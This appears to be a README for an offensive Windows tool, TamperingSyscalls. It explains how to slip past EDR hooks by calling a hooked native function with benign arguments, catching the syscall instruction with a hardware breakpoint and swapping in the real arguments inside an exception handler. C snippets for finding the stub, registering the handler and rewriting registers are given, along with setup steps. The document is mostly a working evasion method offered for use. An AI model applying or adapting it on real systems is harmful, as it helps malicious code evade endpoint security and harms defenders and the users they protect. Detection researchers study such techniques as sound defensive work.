# TamperingSyscalls

Tampering with syscalls. 

1. Set a hardware breakpoint on the address of a syscall instruction which has the bytes `0f05` on the Dr0 register.
We can locate the stub with this quick memory byte search.
```c
BYTE stub[] = { 0x0F, 0x05 };
	for( unsigned int i = 0; i < (unsigned int)25; i++ )
	{
		if( memcmp( (LPVOID)((DWORD_PTR)function + i), stub, 2 ) == 0 ) {
			return (LPVOID)((DWORD_PTR)function + i);
		}
	}
  ```
2. Make a call to this function with no arguments. The EDR will return us the SSN as our call is not malicious.
3. The EDR then returns flow to us. 
4. We then hit our syscall breakpoint where we enter our previously registered exception handler.
```c
SetUnhandledExceptionFilter( OneShotHardwareBreakpointHandler );
```
5. This exception handler will disable the hardware breakpoint for Dr0 only if the Dr0 and RIP match.
6. If it is matching, it'll switch on the StatePointer, and get the corresponding arguments for this function.
7. It will then fix the arguments into the register, and stack.
```c
switch( StatePointer ) {
case 0:
ExceptionInfo->ContextRecord->Rcx =
  (DWORD_PTR)((NtGetContextThread*)(StateArray[StatePointer].arguments))->ThreadHandle;
  ExceptionInfo->ContextRecord->Rdx =
	(DWORD_PTR)((NtGetContextThread*)(StateArray[StatePointer].arguments))->pContext;
// put your other states here.
```

## Howto
You need to implement your function arguments and setup the state.
For example the arguments for NtGetContextThread in a structure.
```c
typedef struct {
	HANDLE			ThreadHandle;
	PCONTEXT		pContext;
} NtGetContextThread;
```
Then make a global copy
```c
NtGetContextThread pNtGetThreadContext;
```
Then add this to the state array in the position we will be calling it
```c
{ 0 , &pNtGetThreadContext},
```
Then in the exception handler you need to fix arguments for the corresponding function. 
